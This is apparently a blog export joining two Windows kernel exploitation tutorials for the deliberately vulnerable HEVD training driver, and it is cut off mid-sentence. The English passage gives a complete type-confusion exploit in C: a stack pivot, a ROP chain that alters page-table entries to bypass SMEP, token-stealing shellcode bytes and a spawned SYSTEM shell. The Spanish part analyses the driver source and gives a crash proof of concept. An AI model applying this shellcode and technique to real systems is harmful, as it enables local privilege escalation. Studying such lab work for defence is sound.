VirtualAlloc() in Windows and mmap() in Linux, we can actually map a range of virtual memory at a defined address. This is why this solution is a solid approach to stack pivoting.\nVirtual Memory # The image below is taken from wafzsucks blog.\nWe can see in the image above that a virtaul address is mapped to multiple regions in physical memory. In short the OS manages virtual address spaces and the assignment of real memory. Address translation hardware in the CPU, often referred to as a memory management unit (MMU), automatically translates virtual addresses to physical addresses.\nAs stated by Wikipedia, the benefits of virtual memory include:\nApplications don\u0026rsquo;t have to manage shared memory space Ability to share memory used by libraries between processes Increased security due to memory isolation And conceptually being able to use more memory than might be physically availible, using the technique of paging or segmentation.\nPaged Memory Summary # When we hear the words Paged memory we\u0026rsquo;re refering to a technique where the OS divides a program\u0026rsquo;s or system\u0026rsquo;s memory into fixed blocks called pages (as we know). Below are some key concepts to keep in mind with paged memory:\nPage Table Operating systems maintain a data structure known as a page table. This table keeps track of the mapping between virtaul memory addresses used by a program and the physical memory address location where the actaul data is stored. Virtual Memory As prevously mentioned this is how programs interact with physical memory without directly touching it. Basically translating virtual addresses to physical addresses. Page Faults When a program access a virtual memory page that is not currently in physical memory, a page fault occurs. From here control is transferred from the program to the operating system. Demand Paging Most operating systems use demang paging, which is where pages are only loaded into memory when needed. This is to conserve physical memory by loading ONLY pages that are actively being used. Page Replacement If physical memory is full, the operating system may need to choose which paged to remove from memory to make space for new pages. Page Size The size of each page is a crucial factor in the efficiency of memory management. A smaller page size can lead to more fine-grained memory management but may also result in increased overhead due to a larger page table. A larger page size might reduce the table size, but may result in more data being loaded into memory even if only a small portion is needed. Testing Theory # Let\u0026rsquo;s revisit our code example and run it.\nlpvAllocTarget = (LPVOID)0xF6C875C0; lpvAllocation = VirtualAlloc((lpvAllocTarget - 0x1000), 0x10000, (MEM_COMMIT | MEM_RESERVE), PAGE_READWRITE); if (lpvAllocation == NULL) { printf(\u0026#34;[*] Failed to allocate memory\\n\u0026#34;); return -1; } UserTypeConfusionObject.ObjectId = (uint64_t)lpvAllocation; UserTypeConfusionObject.ObjectType = (uint64_t)lpvNtKrnl + 0x32e4fe; // mov esp, 0xF6C875C0 ; ret printf(\u0026#34;[*] Triggering Type Confusion\\n\u0026#34;); DeviceIoControl(hHEVD, TYPE_CONFUSION, \u0026amp;UserTypeConfusionObject, sizeof(UserTypeConfusionObject), NULL, 0x00, \u0026amp;dwBytesReturned, NULL); If we check the PTE of the new stack address we\u0026rsquo;ll see this is NOT a valid page entry.\nMeaning that the control will be given to the kernel and we crash!\nThis is due to the aforemention Demand Paging. To make this a valid page, we can try writing to the prevous page to avoid the Page Fault since it will then be in use! Let\u0026rsquo;s try it!\nlpvAllocTarget = (LPVOID)0xF6C875C0; lpvAllocation = VirtualAlloc((lpvAllocTarget - 0x1000), 0x10000, (MEM_COMMIT | MEM_RESERVE), PAGE_READWRITE); if (lpvAllocation == NULL) { printf(\u0026#34;[*] Failed to allocate memory\\n\u0026#34;); return -1; } printf(\u0026#34;[*] Successfully created allocation: 0x%p\\n\u0026#34;, lpvAllocation); printf(\u0026#34;[*] Writing random buffer to prevous page\\n\u0026#34;); RtlFillMemory((lpvAllocTarget-0x1000), 0x1000, \u0026#39;A\u0026#39;); This time when we hit the breakpoint we can see that the page is valid :)\nHowever we still get a crash? This is where VirtualLock comes into play.\nHowever, I still got a crash! Based on the information from Kristal-G\u0026rsquo;s blog it looks like this address it too high. This is also shown by the actual error above - with that I decided to change my stack pivot gadget.\nExploitation # After crying for a while I managed to get together a reliable exploit as shown below:\n#include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;stdint.h\u0026gt; #include \u0026lt;string.h\u0026gt; #include \u0026lt;windows.h\u0026gt; #include \u0026lt;psapi.h\u0026gt; #include \u0026lt;ntdef.h\u0026gt; #include \u0026lt;shlwapi.h\u0026gt; #define TYPE_CONFUSION 0x222023 /* Structure used by Type Confusion */ typedef struct _USER_TYPE_CONFUSION_OBJECT { uint64_t ObjectId; uint64_t ObjectType; } USER_TYPE_CONFUSION_OBJECT, *PUSER_TYPE_CONFUSION_OBJECT; /* GetKernelModuleBase(): Function used to obtain kernel module address */ LPVOID GetKernelModuleBase(PCHAR pKernelModule) { char pcDriver[1024] = { 0 }; LPVOID lpvTargetDriver = NULL; LPVOID *lpvDrivers = NULL; DWORD dwCB = 0; DWORD dwDrivers = 0; DWORD i = 0; EnumDeviceDrivers(NULL, dwCB, \u0026amp;dwCB); if (dwCB \u0026lt;= 0) return NULL; lpvDrivers = (LPVOID *)malloc(dwCB * sizeof(LPVOID)); if (lpvDrivers == NULL) return NULL; if (EnumDeviceDrivers(lpvDrivers, dwCB, \u0026amp;dwCB)) { dwDrivers = dwCB / sizeof(LPVOID); for (i = 0; i \u0026lt; dwDrivers; i++) if (GetDeviceDriverBaseNameA(lpvDrivers[i], pcDriver, sizeof(pcDriver))) if (StrStrA(pcDriver, pKernelModule) != NULL) lpvTargetDriver = lpvDrivers[i]; } free(lpvDrivers); return lpvTargetDriver; } /* CheckWin(): Simple function to check if we\u0026#39;re running as SYSTEM */ int CheckWin(VOID) { DWORD win = 0; DWORD dwLen = 0; CHAR *cUsername = NULL; GetUserNameA(NULL, \u0026amp;dwLen); if (dwLen \u0026gt; 0) { cUsername = (CHAR *)malloc(dwLen * sizeof(CHAR)); } else { printf(\u0026#34;[-] Failed to allocate buffer for username check\\n\u0026#34;); return -1; } GetUserNameA(cUsername, \u0026amp;dwLen); win = strcmp(cUsername, \u0026#34;SYSTEM\u0026#34;); free(cUsername); return (win == 0) ? win : -1; } void WriteGadgets(LPVOID lpvNt, LPVOID lpvBuffer) { uint64_t *rop = (uint64_t *)(lpvBuffer); uint64_t nt = (uint64_t)(lpvNt); uint8_t sc[129] = { // sickle-tool -p windows/x64/kernel_token_stealer -f num (58 bytes) 0x65, 0x48, 0xa1, 0x88, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x8b, 0x80, 0xb8, 0x00, 0x00, 0x00, 0x48, 0x89, 0xc1, 0xb2, 0x04, 0x48, 0x8b, 0x80, 0x48, 0x04, 0x00, 0x00, 0x48, 0x2d, 0x48, 0x04, 0x00, 0x00, 0x38, 0x90, 0x40, 0x04, 0x00, 0x00, 0x75, 0xeb, 0x48, 0x8b, 0x90, 0xb8, 0x04, 0x00, 0x00, 0x48, 0x89, 0x91, 0xb8, 0x04, 0x00, 0x00, // sickle-tool -p windows/x64/kernel_sysret -f num (71) 0x65, 0x48, 0xa1, 0x88, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x66, 0x8b, 0x88, 0xe4, 0x01, 0x00, 0x00, 0x66, 0xff, 0xc1, 0x66, 0x89, 0x88, 0xe4, 0x01, 0x00, 0x00, 0x48, 0x8b, 0x90, 0x90, 0x00, 0x00, 0x00, 0x48, 0x8b, 0x8a, 0x68, 0x01, 0x00, 0x00, 0x4c, 0x8b, 0x9a, 0x78, 0x01, 0x00, 0x00, 0x48, 0x8b, 0xa2, 0x80, 0x01, 0x00, 0x00, 0x48, 0x8b, 0xaa, 0x58, 0x01, 0x00, 0x00, 0x31, 0xc0, 0x0f, 0x01, 0xf8, 0x48, 0x0f, 0x07 }; LPVOID shellcode = VirtualAlloc(NULL, sizeof(sc), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE); RtlCopyMemory(shellcode, sc, 129); /* Prepare RDX register for later. This is needed for the XOR operation */ *rop++ = nt + 0x40ed4e; // pop rdx ; pop rax ; pop rcx ; ret *rop++ = 0x000008; // Set RDX to 0x08, we will need this to accomplish the XOR *rop++ = 0x000000; // [filler] *rop++ = 0x000000; // [filler] /* Setup the call to MiGetPteAddress in order to get the address of the PTE for our userland code. The setup is as follows: RAX -\u0026gt; VOID *MiGetPteAddress( ( RCX == PTE / Userland Code ) ); Once the call is complete RAX should contain the pointer to our PTE. */ *rop++ = nt + 0x57699c; // pop rcx ; ret *rop++ = (uint64_t)shellcode; // *shellcode *rop++ = nt + 0x24aaec; // MiGetPteAddress() /* Now that we have obtained the PTE address, we can modify the 2nd bit in order to mark the page as a kernel page (U -\u0026gt; K). We can do this using XOR ;) */ *rop++ = nt + 0x30fcf3; // sub rax, rdx ; ret *rop++ = nt + 0x54f344; // push rax ; pop rbx ; ret *rop++ = nt + 0x40ed4e; // pop rdx ; pop rax ; pop rcx ; ret *rop++ = 0x000004; // 0x40ed4e: pop rdx ; pop rax ; pop rcx ; ret ; (1 found) *rop++ = 0x000000; // [filler] *rop++ = 0x000000; // [filler] *rop++ = nt + 0x3788b6; // xor [rbx+0x08], edx ; mov rbx, qword [rsp+0x60] ; add rsp, 0x40 ; pop r14 ; pop rdi ; pop rbp ; ret /* Now we cam spray our shellcode address since SMEP and VPS should be bypassed */ for (int i = 0; i \u0026lt; 0xC; i++) { *rop++ = (uint64_t)shellcode; } } /* Exploit(): Type Confusion */ int Exploit(HANDLE hHEVD) { uint64_t *rop = NULL; BOOL bBlocked; DWORD dwBytesReturned = 0; LPVOID lpvNtKrnl = NULL; LPVOID lpvAllocation = NULL; LPVOID lpvAllocTarget = NULL; USER_TYPE_CONFUSION_OBJECT UserTypeConfusionObject = { 0 }; lpvNtKrnl = GetKernelModuleBase(\u0026#34;ntoskrnl\u0026#34;); if (lpvNtKrnl == NULL) { printf(\u0026#34;[-] Failed to obtain the base address of nt\\n\u0026#34;); return -1; } printf(\u0026#34;[*] Obtained the base address of nt: 0x%p\\n\u0026#34;, lpvNtKrnl); /* Allocate memory one page before the target memory region. This helps prevent the Double Fault; Logic here is avoid not triggering \u0026#34;Demand Paging\u0026#34;. */ lpvAllocTarget = (LPVOID)0x48000000; printf(\u0026#34;[*] Allocation to be made at 0x%p - PAGE_SIZE\\n\u0026#34;, lpvAllocTarget); lpvAllocation = VirtualAlloc((lpvAllocTarget - 0x1000), 0x10000, (MEM_COMMIT | MEM_RESERVE), PAGE_READWRITE); if (lpvAllocation == NULL) { printf(\u0026#34;[*] Failed to allocate memory\\n\u0026#34;); return -1; } printf(\u0026#34;[*] Successfully created allocation: 0x%p\\n\u0026#34;, lpvAllocation); /* Trigger the Type Confusion by overwriting the function pointer */ UserTypeConfusionObject.ObjectId = 0x4242424242424242; UserTypeConfusionObject.ObjectType = (uint64_t)lpvNtKrnl + 0x28d700; // mov esp, 0x48000000 ; add esp, 0x28 ; ret /* Let the Kernel breathe... this is needed to avoid a crash, my thoery is if we don\u0026#39;t do this the allocation will not be mapped properly. So what we need to do is sleep for a few seconds to allow this to happen! First time trying this I was under the impression VirtualLock was needed, but when testing it never locked? So after debugging I found this to be the solution. This exploit succeded 9/10 times vs the original 2/10 ;D */ printf(\u0026#34;[*] Letting the kernel breathe\u0026#34;); for (int i = 0; i \u0026lt; 4; i++) { putchar(\u0026#39;.\u0026#39;); Sleep(1000); } putchar(\u0026#39;\\n\u0026#39;); /* Fill the page before the target region with random data */ RtlFillMemory(lpvAllocation, 0x1000, \u0026#39;A\u0026#39;); /* Write the gadget chain at the location we return */ WriteGadgets(lpvNtKrnl, (lpvAllocTarget + 0x28)); printf(\u0026#34;[*] Triggering Type Confusion\\n\u0026#34;); DeviceIoControl(hHEVD, TYPE_CONFUSION, \u0026amp;UserTypeConfusionObject, sizeof(UserTypeConfusionObject), NULL, 0x00, \u0026amp;dwBytesReturned, NULL); return CheckWin(); } int main() { HANDLE hHEVD = NULL; hHEVD = CreateFileA(\u0026#34;\\\\\\\\.\\\\HackSysExtremeVulnerableDriver\u0026#34;, (GENERIC_READ | GENERIC_WRITE), 0x00, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL); if (hHEVD == INVALID_HANDLE_VALUE) { printf(\u0026#34;[-] Failed to get a handle on HackSysExtremeVulnerableDriver\\n\u0026#34;); return -1; } if (Exploit(hHEVD) == 0) { printf(\u0026#34;[+] Exploitation successful, enjoy the shell!!\\n\\n\u0026#34;); system(\u0026#34;cmd.exe\u0026#34;); } else { printf(\u0026#34;[*] Exploitation failed, run again\\n\u0026#34;); } if (hHEVD != NULL) CloseHandle(hHEVD); return 0; } If you followed along, we had a valid page? So why did we need VirtualLock?\nWell\u0026hellip; we didn\u0026rsquo;t! The exploit shown above did not use the VirtualLock function at all. When debugging we saw that the page was valid\u0026hellip; in addition VirtualLock never succeeded\u0026hellip; I would keep getting the error code ERROR_NOACCESS (0x3E6) meaning the page never \u0026ldquo;locked\u0026rdquo;.\nIf you check the documentation on MSDN you\u0026rsquo;ll see that two calls are needed sometimes, due to the way this function works. Does it need higher privileges? Not sure but I removed it to test if it was doing anything, and to my suprise it wasn\u0026rsquo;t.\nIn addition I found exploitation to be really unreliable. In order to make it work 90% of the time (If not 100%), what needed to be done?\nYou guessed it! A call to Sleep() :P\nMy thoery is that the allocation needed time to \u0026ldquo;register\u0026rdquo;. Regardless exploitation demo shown below!\nSources # https://wafzsucks.medium.com/how-a-simple-k-typeconfusion-took-me-3-months-long-to-create-a-exploit-f643c94d445f https://kristal-g.github.io/2021/02/20/HEVD_Type_Confusion_Windows_10_RS5_x64.html https://kristal-g.github.io/2021/02/07/HEVD_StackOverflowGS_Windows_10_RS5_x64.html ","date":"18 January 2025","externalUrl":null,"permalink":"/posts/0x06-approaching-modern-windows-kernel-type-confusions/","section":"Posts","summary":"","title":"0x06 - Approaching Modern Windows Kernel Type Confusions","type":"posts"},{"content":"En el último tutorial aprovechamos un \u0026ldquo;Write-What-Where\u0026rdquo; o un “Escribir Qué Dónde” dentro de Windows 7 (x86) y Windows 11 (x64).\nIgual que en los últimos tutoriales, introduciremos una nueva falla en Windows 7 (x86) kernel para obtener una base sólida sobre cómo ocurre la vulnerabilidad. Para ser más específicos, aprenderemos cómo aprovechar un Type Confusion!\nTable of Contents # Qué es un Type Confusion (Alto Nivel) Usando el Código TypeConfusionIoctlHandler TriggerTypeConfusion TypeConfusionObjectInitializer Pruebas Dinámicas Explotación Qué es un Type Confusion (Alto Nivel) # No estás familiarizado con lo que es un Type Confusion? Comencemos con una descripción general de lo que es!\nPara usar un ejemplo no técnico, veamos una hipótesis con Dark Souls. En la imagen abajo podemos ver a Siegmeyer of Catarina sentado afuera de la entrada de Sen\u0026rsquo;s Fortress.\nSi miramos más cerca, podemos ver que detrás de Siegmeyer hay una Estus Flask que funciona como cualquier taza, sin embargo en Dark Souls se usa para reponer tu salud.\nDentro de Sen’s Fortress hay enemigos conocidos como “Man-Serpent soldiers”, estos enemigos se pueden ver hacia abajo. Siendo estas serpientes, quizás también contienen veneno.\nDado que una Estus Flask contiene líquido, hipotéticamente se podría cambiar el líquido utilizado para reponer la salud por otra cosa o, en el peor de los casos, modificarlo?\nDado que Siegmeyer está sumido en sus pensamientos, si abriéramos la puerta y él no se diera cuenta, hipotéticamente una serpiente podría tomar de el Estus Flask y reemplazar la cantidad que bebo con veneno. Si Siegmeyer no se da cuenta, morirá!\nEste ataque de la serpiente es muy similar al de un Type Confusion. Un Type Confusion ocurre cuando un programa asume incorrectamente que un objeto o variable es de un tipo cuando en realidad es de otro. Este tipo de desajuste puede tener consecuencias horribles.\nPodemos correlacionar esto con nuestro ejemplo:\nEl programa (Siegmeyer) espera un tipo específico (poción de salud) basado en el objeto (Estus Flask). Un atacante (la serpiente) cambia la información a un tipo diferente sin que el programa se dé cuenta. El programa (Siegmeyer) utiliza el objeto y esto tiene consecuencias catastróficas. En términos técnicos, esto sucede cuando los tipos de variables del lenguaje de programación se convierten incorrectamente, por ejemplo en C++ encasillamiento inseguro (unsafe typecasting) o JavaScript con mecanografía suelta (\u0026ldquo;loose typing\u0026rdquo;). Luego, los atacantes pueden aprovechar estas vulnerabilidades para dañar la memoria o incluso ejecutar código.\nCon la descripción general completa, podemos comenzar y ver código!\nUsando el Código # Podemos comenzar identificando las ubicaciones de código adecuado.\n$ ls -l | grep Type -rw-r--r-- 1 wetw0rk wetw0rk 7736 Oct 24 22:20 TypeConfusion.c -rw-r--r-- 1 wetw0rk wetw0rk 2954 Oct 24 22:20 TypeConfusion.h Al observar el código, nos centraremos en las siguientes funciones.\nTypeConfusionIoctlHandler() TriggerTypeConfusion() TypeConfusionObjectInitializer() TypeConfusionObjectCallback() Empecemos desde arriba!\nTypeConfusionIoctlHandler # TypeConfusionIoctlHandler es la función que se llamará al enviar el código de IOCTL. Igual como los ejemplos anteriores, convertimos nuestra información en un objeto / estructura. En este caso PUSER_TYPE_CONFUSION_OBJECT.\n218 NTSTATUS 219 TypeConfusionIoctlHandler( 220 _In_ PIRP Irp, 221 _In_ PIO_STACK_LOCATION IrpSp 222 ) 223 { 224 NTSTATUS Status = STATUS_UNSUCCESSFUL; 225 PUSER_TYPE_CONFUSION_OBJECT UserTypeConfusionObject = NULL; 226 227 UNREFERENCED_PARAMETER(Irp); 228 PAGED_CODE(); 229 230 UserTypeConfusionObject = (PUSER_TYPE_CONFUSION_OBJECT)IrpSp-\u0026gt;Parameters.DeviceIoControl.Type3InputBuffer; 231 232 if (UserTypeConfusionObject) 233 { 234 Status = TriggerTypeConfusion(UserTypeConfusionObject); 235 } 236 237 return Status; 238 } Echemonos una mirada a la estructura PUSER_TYPE_CONFUSION_OBJECT dentro de TypeConfusion.h.\nDentro del código también podemos ver otra estructura definida, siendo esta estructura _KERNEL_TYPE_CONFUSION_OBJECT.\n62 typedef struct _USER_TYPE_CONFUSION_OBJECT 63 { 64 ULONG_PTR ObjectID; 65 ULONG_PTR ObjectType; 66 } USER_TYPE_CONFUSION_OBJECT, *PUSER_TYPE_CONFUSION_OBJECT; 67 68 #pragma warning(push) 69 #pragma warning(disable : 4201) 70 typedef struct _KERNEL_TYPE_CONFUSION_OBJECT 71 { 72 ULONG_PTR ObjectID; 73 union 74 { 75 ULONG_PTR ObjectType; 76 FunctionPointer Callback; 77 }; 78 } KERNEL_TYPE_CONFUSION_OBJECT, *PKERNEL_TYPE_CONFUSION_OBJECT; 79 #pragma warning(pop) Si estás familiarizado con C, esto no debería ser demasiado complicado. Vemos dos punteros unsigned long cuando usamos la estructura USER_TYPE_CONFUSION_OBJECT.\nDentro de la estructura _KERNEL_TYPE_CONFUSION_OBJECT vemos un puntero unsigned long y una unión. Dentro de la unión vemos un puntero unsigned long y un puntero de función.\nDesde la perspectiva de aprovechar la aplicación, este sería un objetivo ideal, porque FunctionPointer es un puntero a una función\u0026hellip; como su nombre indica.\nEsto se puede ver en Common.h.\n70 typedef void(*FunctionPointer)(); TriggerTypeConfusion # TriggerTypeConfusion es donde se pasa PUSER_TYPE_CONFUSION_OBJECT, esta función se puede ver abajo\n105 NTSTATUS 106 TriggerTypeConfusion( 107 _In_ PUSER_TYPE_CONFUSION_OBJECT UserTypeConfusionObject 108 ) 109 { 110 NTSTATUS Status = STATUS_UNSUCCESSFUL; 111 PKERNEL_TYPE_CONFUSION_OBJECT KernelTypeConfusionObject = NULL; 112 113 PAGED_CODE(); 114 115 __try 116 { 117 // 118 // Verify if the buffer resides in user mode 119 // 120 121 ProbeForRead( 122 UserTypeConfusionObject, 123 sizeof(USER_TYPE_CONFUSION_OBJECT), 124 (ULONG)__alignof(UCHAR) 125 ); 126 127 // 128 // Allocate Pool chunk 129 // 130 131 KernelTypeConfusionObject = (PKERNEL_TYPE_CONFUSION_OBJECT)ExAllocatePoolWithTag( 132 NonPagedPool, 133 sizeof(KERNEL_TYPE_CONFUSION_OBJECT), 134 (ULONG)POOL_TAG 135 ); 136 137 if (!KernelTypeConfusionObject) 138 { 139 // 140 // Unable to allocate Pool chunk 141 // 142 143 DbgPrint(\u0026#34;[-] Unable to allocate Pool chunk\\n\u0026#34;); 144 145 Status = STATUS_NO_MEMORY; 146 return Status; 147 } 148 else 149 { 150 DbgPrint(\u0026#34;[+] Pool Tag: %s\\n\u0026#34;, STRINGIFY(POOL_TAG)); 151 DbgPrint(\u0026#34;[+] Pool Type: %s\\n\u0026#34;, STRINGIFY(NonPagedPool)); 152 DbgPrint(\u0026#34;[+] Pool Size: 0x%X\\n\u0026#34;, sizeof(KERNEL_TYPE_CONFUSION_OBJECT)); 153 DbgPrint(\u0026#34;[+] Pool Chunk: 0x%p\\n\u0026#34;, KernelTypeConfusionObject); 154 } 154 } 155 156 DbgPrint(\u0026#34;[+] UserTypeConfusionObject: 0x%p\\n\u0026#34;, UserTypeConfusionObject); 157 DbgPrint(\u0026#34;[+] KernelTypeConfusionObject: 0x%p\\n\u0026#34;, KernelTypeConfusionObject); 158 DbgPrint(\u0026#34;[+] KernelTypeConfusionObject Size: 0x%X\\n\u0026#34;, sizeof(KERNEL_TYPE_CONFUSION_OBJECT)); 159 160 KernelTypeConfusionObject-\u0026gt;ObjectID = UserTypeConfusionObject-\u0026gt;ObjectID; 161 KernelTypeConfusionObject-\u0026gt;ObjectType = UserTypeConfusionObject-\u0026gt;ObjectType; 162 163 DbgPrint(\u0026#34;[+] KernelTypeConfusionObject-\u0026gt;ObjectID: 0x%p\\n\u0026#34;, KernelTypeConfusionObject-\u0026gt;ObjectID); 164 DbgPrint(\u0026#34;[+] KernelTypeConfusionObject-\u0026gt;ObjectType: 0x%p\\n\u0026#34;, KernelTypeConfusionObject-\u0026gt;ObjectType); 165 166 167 #ifdef SECURE 168 // 169 // Secure Note: This is secure because the developer is properly setting \u0026#39;Callback\u0026#39; 170 // member of the \u0026#39;KERNEL_TYPE_CONFUSION_OBJECT\u0026#39; structure before passing the pointer 171 // of \u0026#39;KernelTypeConfusionObject\u0026#39; to \u0026#39;TypeConfusionObjectInitializer()\u0026#39; function as 172 // parameter 173 // 174 175 KernelTypeConfusionObject-\u0026gt;Callback = \u0026amp;TypeConfusionObjectCallback; 176 Status = TypeConfusionObjectInitializer(KernelTypeConfusionObject); 177 #else 178 DbgPrint(\u0026#34;[+] Triggering Type Confusion\\n\u0026#34;); 179 180 // 181 // Vulnerability Note: This is a vanilla Type Confusion vulnerability due to improper 182 // use of the \u0026#39;UNION\u0026#39; construct. The developer has not set the \u0026#39;Callback\u0026#39; member of 183 // the \u0026#39;KERNEL_TYPE_CONFUSION_OBJECT\u0026#39; structure before passing the pointer of 184 // \u0026#39;KernelTypeConfusionObject\u0026#39; to \u0026#39;TypeConfusionObjectInitializer()\u0026#39; function as 185 // parameter 186 // 187 188 Status = TypeConfusionObjectInitializer(KernelTypeConfusionObject); 189 #endif 190 191 DbgPrint(\u0026#34;[+] Freeing KernelTypeConfusionObject Object\\n\u0026#34;); 192 DbgPrint(\u0026#34;[+] Pool Tag: %s\\n\u0026#34;, STRINGIFY(POOL_TAG)); 193 DbgPrint(\u0026#34;[+] Pool Chunk: 0x%p\\n\u0026#34;, KernelTypeConfusionObject); 194 195 // 196 // Free the allocated Pool chunk 197 // 198 199 ExFreePoolWithTag((PVOID)KernelTypeConfusionObject, (ULONG)POOL_TAG); 200 KernelTypeConfusionObject = NULL; 201 } 202 __except (EXCEPTION_EXECUTE_HANDLER) 203 { 204 Status = GetExceptionCode(); 205 DbgPrint(\u0026#34;[-] Exception Code: 0x%X\\n\u0026#34;, Status); 206 } 206 } 207 208 return Status; 209 } Como ocurre con todas las funciones grandes, analicemos esto pieza por pieza. Primero, asignamos un objeto PKERNEL_TYPE_CONFUSION_OBJECT en el NonPagedPool.\n131 KernelTypeConfusionObject = (PKERNEL_TYPE_CONFUSION_OBJECT)ExAllocatePoolWithTag( 132 NonPagedPool, 133 sizeof(KERNEL_TYPE_CONFUSION_OBJECT), 134 (ULONG)POOL_TAG 135 ); A partir de ahí, suponiendo que todo salió bien, el conductor asigna los miembros ObjectID y ObjectType a la estructura KernelTypeConfusionObject que asignamos utilizando nuestra información.\n160 KernelTypeConfusionObject-\u0026gt;ObjectID = UserTypeConfusionObject-\u0026gt;ObjectID; 161 KernelTypeConfusionObject-\u0026gt;ObjectType = UserTypeConfusionObject-\u0026gt;ObjectType; Luego llamamos a TypeConfusionObjectInitializer usando este objeto como el único parámetro.\n188 Status = TypeConfusionObjectInitializer(KernelTypeConfusionObject); Saltaremos esta función, sin embargo, el tipo devuelto es de NTSTATUS.\nAl finalizar este análisis de código, podemos ver que el objeto asignado se libera y luego se establece en NULL.\n191 DbgPrint(\u0026#34;[+] Freeing KernelTypeConfusionObject Object\\n\u0026#34;); 192 DbgPrint(\u0026#34;[+] Pool Tag: %s\\n\u0026#34;, STRINGIFY(POOL_TAG)); 193 DbgPrint(\u0026#34;[+] Pool Chunk: 0x%p\\n\u0026#34;, KernelTypeConfusionObject); 194 195 // 196 // Free the allocated Pool chunk 197 // 198 199 ExFreePoolWithTag((PVOID)KernelTypeConfusionObject, (ULONG)POOL_TAG); 200 KernelTypeConfusionObject = NULL; 201 } 202 __except (EXCEPTION_EXECUTE_HANDLER) 203 { 204 Status = GetExceptionCode(); 205 DbgPrint(\u0026#34;[-] Exception Code: 0x%X\\n\u0026#34;, Status); 206 } 207 208 return Status; 209 } Lo principal a tener en cuenta sobre esta función es que el miembro Callback nunca se establece. Es posible que podamos utilizar esto a nuestro favor\u0026hellip;\nTypeConfusionObjectInitializer # Para recapitular, PKERNEL_TYPE_CONFUSION_OBJECT se pasa a la función TypeConfusionObjectInitializer desde la función TriggerTypeConfusion.\nPodemos ver el código para TypeConfusionObjectInitializer abajo.\n80 NTSTATUS 81 TypeConfusionObjectInitializer( 82 _In_ PKERNEL_TYPE_CONFUSION_OBJECT KernelTypeConfusionObject 83 ) 84 { 85 NTSTATUS Status = STATUS_SUCCESS; 86 87 PAGED_CODE(); 88 89 DbgPrint(\u0026#34;[+] KernelTypeConfusionObject-\u0026gt;Callback: 0x%p\\n\u0026#34;, KernelTypeConfusionObject-\u0026gt;Callback); 90 DbgPrint(\u0026#34;[+] Calling Callback\\n\u0026#34;); 91 92 KernelTypeConfusionObject-\u0026gt;Callback(); 93 94 DbgPrint(\u0026#34;[+] Kernel Type Confusion Object Initialized\\n\u0026#34;); 95 96 return Status; 97 } Interesante\u0026hellip; parece que simplemente llamamos al miembro Callback()\u0026hellip; Me pregunto si cuando escribimos en KernelTypeConfusionObject podríamos sobrescribir o más bien asignar a la memoria adyacente parte de nuestro buffer?\nPruebas Dinámicas # En este punto sentí que tenía una comprensión sólida de cómo funciona esta función, así que decidí empezar a jugar con ella y observar el comportamiento.\nDesarrollé lo siguiente que sirviera como mi PoC:\n#include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;stdint.h\u0026gt; #include \u0026lt;string.h\u0026gt; #include \u0026lt;windows.h\u0026gt; #include \u0026lt;psapi.h\u0026gt; #include \u0026lt;ntdef.h\u0026gt; #include \u0026lt;winternl.h\u0026gt; #include \u0026lt;shlwapi.h\u0026gt; #define IOCTL(Function) CTL_CODE (FILE_DEVICE_UNKNOWN, Function, METHOD_NEITHER, FILE_ANY_ACCESS) #define HEVD_IOCTL_TYPE_CONFUSION IOCTL(0x808) typedef struct _USER_TYPE_CONFUSION_OBJECT { ULONG_PTR ObjectID; ULONG_PTR ObjectType; } USER_TYPE_CONFUSION_OBJECT, *PUSER_TYPE_CONFUSION_OBJECT; int Exploit(HANDLE hHEVD) { USER_TYPE_CONFUSION_OBJECT UserTypeConfusionObject = { 0 }; ULONG oId = 0x41414141; ULONG oType = 0x42424242; DWORD dwBytesReturned = 0; UserTypeConfusionObject.ObjectType = oType; UserTypeConfusionObject.ObjectID = oId; DeviceIoControl(hHEVD, HEVD_IOCTL_TYPE_CONFUSION, \u0026amp;UserTypeConfusionObject, sizeof(UserTypeConfusionObject), NULL, 0x00, \u0026amp;dwBytesReturned, NULL); return 0; } int main() { HANDLE hHEVD = NULL; hHEVD = CreateFileA(\u0026#34;\\\\\\\\.\\\\HackSysExtremeVulnerableDriver\u0026#34;, (GENERIC_READ | GENERIC_WRITE), 0x00, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL); if (hHEVD == NULL) { printf(\u0026#34;[-] Failed to get a handle on HackSysExtremeVulnerableDriver\\n\u0026#34;); return -1; } Exploit(hHEVD); if (hHEVD != INVALID_HANDLE_VALUE) { CloseHandle(hHEVD); } } Establezcamos un punto de interrupción justo cuando llamamos a la función TypeConfusionInitializer para ver qué se pasa a la función.\nUna vez pegado, podemos ver que el puntero a nuestro objeto (almacenado en la parte superior de la stack) contiene un búfer de 16 bytes. Eso es aproximadamente 8 bytes más de lo esperado.\nSi miramos esto desde la perspectiva de la estructura misma, solo debería tener 8 bytes.\n$ gcc struct_size.c -m32 $ ./a.out Sizeof USER_TYPE_CONFUSION_OBJECT : 8 Sizeof KERNEL_TYPE_CONFUSION_OBJECT : 8 Pero espera, no debería la KERNEL_TYPE_CONFUSION_OBJECT tener 12 bytes \u0026ldquo;(sizeof(ULONG_PTR) + sizeof(ULONG_PTR) + sizeof(FunctionPointer))\u0026rdquo;?\nDespués de buscar en Google, parece que el tamaño de una unión está determinado por el tamaño de su miembro más grande.\nEntonces esta asignación es de 8 bytes??\nKernelTypeConfusionObject = (PKERNEL_TYPE_CONFUSION_OBJECT)ExAllocatePoolWithTag( NonPagedPool, sizeof(KERNEL_TYPE_CONFUSION_OBJECT), (ULONG)POOL_TAG ); Ejecutémoslo nuevamente, esta vez estableciendo un punto de interrupción en la llamada a ExAllocatePoolWithTag.\nInteresante\u0026hellip; como se esperaba, son 8 bytes\u0026hellip;\nAhora veamos qué se pasa a TypeConfusionObjectInitializer.\nEsta vez no vemos más información de la esperada, pero podemos ver que la devolución de llamada es una dirección no válida.\nSi continuamos con el paso, eventualmente llegaremos a la llamada a la función de devolución de llamada. Una vez allí, podremos ver que en realidad estamos llamando a una dirección que no es válida.\nMás específicamente la información que enviamos.\nSi damos un paso más, podemos ver que pudimos provocar corrupción de memoria.\nSin embargo, ¡el kernel no falló! Si continúa la ejecución, notará que Windows continúa con su comportamiento normal. Es realmente importante saber esto desde la perspectiva del 